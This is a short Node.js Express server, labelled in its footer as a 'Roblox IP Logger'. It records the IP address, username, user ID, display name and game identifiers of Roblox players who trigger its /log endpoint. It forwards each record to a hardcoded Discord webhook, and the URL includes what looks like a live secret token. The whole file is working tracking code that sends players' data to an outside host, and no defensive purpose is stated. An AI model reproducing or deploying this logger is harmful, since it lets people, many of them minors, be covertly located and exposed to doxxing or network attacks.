const express = require('express');
const axios = require('axios');
const app = express();

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1469544408444567766/3PcIRNOpYQ8bsYJECwwDXK6H24Aoe6VpidxaURUv6ThwVkke3IgcnKdZPDIenEBKbMgi';

app.get('/log', async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    const { username, userId, displayName, placeId, gameId } = req.query;

    const embed = {
        embeds: [{
            title: "New Player Joined",
            color: 2329855,
            fields: [
                { name: "Username", value: username || "N/A", inline: true },
                { name: "User ID", value: userId || "N/A", inline: true },
                { name: "Display Name", value: displayName || "N/A", inline: true },
                { name: "IP Address", value: ip || "Unknown", inline: true },
                { name: "Join Time", value: new Date().toISOString().replace('T', ' ').slice(0, 19) + " UTC", inline: true },
                { name: "Game ID", value: gameId || "N/A", inline: true },
                { name: "Place ID", value: placeId || "N/A", inline: false }
            ],
            footer: { text: "Roblox IP Logger • " + new Date().toLocaleString() }
        }]
    };

    try {
        await axios.post(WEBHOOK_URL, embed);
        res.status(200).send("Logged");
    } catch (e) {
        res.status(500).send("Error");
    }
});

app.listen(process.env.PORT || 3000);
